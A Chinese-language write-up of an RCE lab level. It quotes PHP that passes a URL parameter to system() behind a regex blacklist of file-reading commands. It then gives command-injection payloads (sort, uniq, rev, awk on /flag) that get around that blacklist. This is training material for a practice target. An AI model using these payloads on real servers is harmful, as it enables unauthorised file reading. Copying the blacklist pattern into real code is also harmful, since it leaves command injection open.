  • 题目名称：RCE-Labs Level 8 (sort 命令排序输出)
  • 靶场链接：http://靶机IP:8080/less-8/
  • 涉及工具：浏览器

二、解题步骤

1. 分析题目考什么

黑名单继续累加（大概率包含了 nl、sed、grep 等），考察的是对 Linux 文本排序工具 sort 的使用。

2. 怎么解

源码核心逻辑

$pattern = '/cat|tac|head|tail|more|less|nl|sed/';
if(!preg_match($pattern,$cmd)){
    system($cmd);
}

最终成功 Payload

使用 sort 命令对文件内容进行排序输出：

?cmd=sort /flag

备用方案：如果 sort 被拦截或无回显，可尝试去重、反转等工具：

?cmd=uniq /flag
?cmd=rev /flag
?cmd=awk '{print}' /flag

3. 经验总结

  • 这关的核心思路依然是“命令替换”。当开发者拉黑了你常用的 `cat`、`nl`、`sed` 时，你依然可以用 `sort`、`uniq`、`rev` 等数据处理命令来读出文件内容。
  • 永远不要低估 Linux 管道和文本处理命令的丰富程度。
